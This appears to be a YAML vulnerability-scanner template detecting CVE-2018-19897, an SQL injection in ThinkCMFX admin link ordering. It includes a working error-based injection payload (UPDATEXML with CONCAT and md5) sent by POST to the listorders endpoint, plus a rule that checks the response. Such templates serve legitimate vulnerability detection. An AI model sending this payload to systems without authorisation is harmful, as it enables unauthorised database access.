name: poc-yaml-thinkcmf-cve-2018-19897-sqli
binding: 518b41cf-697c-46a8-8596-741107366f9d
manual: true
detail:
    author: min(minrui.zhang@chaitin.com)
    links:
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-19897
        - https://github.com/thinkcmf/cmfx/issues/26
    vulnerability:
        id: CT-38813
        level: high
    ThinkCMF: ThinkCMFX <=2.2.3
    info: 后台管理员权限
transport: http
set:
    rand1: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /?g=Admin&m=Link&a=listorders
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: listorders[key][0]=exp&listorders[key][1]=0 and UPDATEXML(1, CONCAT(0x7e,(select md5({{rand1}})),0),1)-- -
            follow_redirects: false
        expression: response.body.bcontains(bytes(substr(md5(string(rand1)), 0, 31)))
expression: r0()
